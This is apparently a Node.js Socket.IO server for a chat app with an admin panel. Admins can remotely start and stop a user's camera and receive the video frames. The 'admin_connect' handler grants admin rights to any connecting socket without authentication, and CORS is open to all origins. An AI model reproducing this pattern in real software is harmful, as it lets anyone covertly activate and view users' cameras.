// socket-server.js
const { Server } = require("socket.io");
const http = require("http");
const cors = require("cors");
const express = require("express");

//this is for logging
const fs = require("fs");
const path = require("path");
const logFilePath = path.join(__dirname, "..", "logs", "admin_panel.log");

const app = express();
app.use(cors());

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*", // Gerekirse buraya frontend URL'ini yaz
    methods: ["GET", "POST"]
  }
});

function logToFile(message, level = "INFO", source = "SOCKET") {
  const logEntry = `${new Date().toISOString()} [${source}] [${level}] ${message}\n`;
  fs.appendFileSync(logFilePath, logEntry);
}

const connectedUsers = {};
const adminConnections = [];

io.on("connection", (socket) => {
  console.log("Bir kullanıcı bağlandı:", socket.id);
  logToFile(`Kullanıcı ${socket.id} bağlantıyı açtı.`);
  
  // Admin bağlantıları için
  socket.on("admin_connect", () => {
    console.log(`Admin bağlandı: ${socket.id}`);
    logToFile(`Admin bağlandı: ${socket.id}`, "INFO", "SOCKET");
    adminConnections.push(socket.id);
    socket.join("admin-room");
  });
  
  // Kullanıcı login olduysa bağlandığında user_id bilgisini yollamalı
  socket.on("user_login", (userId) => {
    connectedUsers[userId] = socket.id;
    console.log(`Kullanıcı ${userId} giriş yaptı.`);
    logToFile(`Kullanıcı ${userId} giriş yaptı.`, "INFO", "SOCKET");
  });

  // Video frame alıcı
  socket.on("video_frame", (frameData) => {
    // Admin panel bağlantılarına frame gönder
    io.to("admin-room").emit("client_video_frame", {
      socketId: socket.id,
      userId: frameData.userId,
      frame: frameData.frame,
      timestamp: frameData.timestamp
    });
    
    // Console'a log yazma - çok fazla log oluşturacağı için kapatıldı
    // console.log(`Video frame alındı: ${frameData.userId || socket.id}`);
  });

  // Mesaj gönderme
  socket.on("send_message", ({ chat_id, sender_id, receiver_id, content }) => {
    console.log(`[SOCKET] Mesaj geldi: ${content} (${sender_id} ➝ ${receiver_id})`);

    // Alıcıya mesaj iletiliyor
    const receiverSocket = connectedUsers[receiver_id];
    if (receiverSocket) {
      io.to(receiverSocket).emit("new_message", {
        chat_id,
        sender_id,
        receiver_id,
        content,
        sent_at: new Date().toISOString()
      });
    }

    // Mesajı FastAPI'ye kaydet
    fetch("http://127.0.0.1:8000/messages/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id, sender_id, content })
    }).then(res => res.json()).then(data => {
      console.log("Mesaj API'ye kaydedildi:", data);
    });
  });

  socket.on("disconnect", () => {
    console.log("Bir kullanıcı ayrıldı:", socket.id);
    logToFile(`Kullanıcı ${socket.id} bağlantıyı kapattı.`, "INFO", "SOCKET");

    // Admin bağlantılarından çıkar
    const adminIndex = adminConnections.indexOf(socket.id);
    if (adminIndex !== -1) {
      adminConnections.splice(adminIndex, 1);
    }

    // connectedUsers'tan sil
    for (let uid in connectedUsers) {
      if (connectedUsers[uid] === socket.id) {
        delete connectedUsers[uid];
        break;
      }
    }
  });

  socket.on("user_logout", (userId) => {
    console.log(`Kullanıcı ${userId} çıkış yaptı.`);
    logToFile(`Kullanıcı ${userId} çıkış yaptı.`, "INFO", "SOCKET");
    delete connectedUsers[userId];
  });
  
  // Admin komutları
  socket.on("admin_command", (command) => {
    if (adminConnections.includes(socket.id)) {
      console.log(`Admin komutu alındı: ${command.action}`);
      
      // Kamera başlatma komutu
      if (command.action === "start_camera" && command.targetUserId) {
        const targetSocket = connectedUsers[command.targetUserId];
        if (targetSocket) {
          io.to(targetSocket).emit("admin_command", { action: "start_camera" });
          logToFile(`Admin ${socket.id} kullanıcı ${command.targetUserId} için kamera başlattı`, "INFO", "ADMIN-COMMAND");
        }
      }
      
      // Kamera kapatma komutu
      if (command.action === "stop_camera" && command.targetUserId) {
        const targetSocket = connectedUsers[command.targetUserId];
        if (targetSocket) {
          io.to(targetSocket).emit("admin_command", { action: "stop_camera" });
          logToFile(`Admin ${socket.id} kullanıcı ${command.targetUserId} için kamerayı kapattı`, "INFO", "ADMIN-COMMAND");
        }
      }
    }
  });
});

server.listen(3000, () => {
  console.log("Socket.IO server is running on port 3000");
});
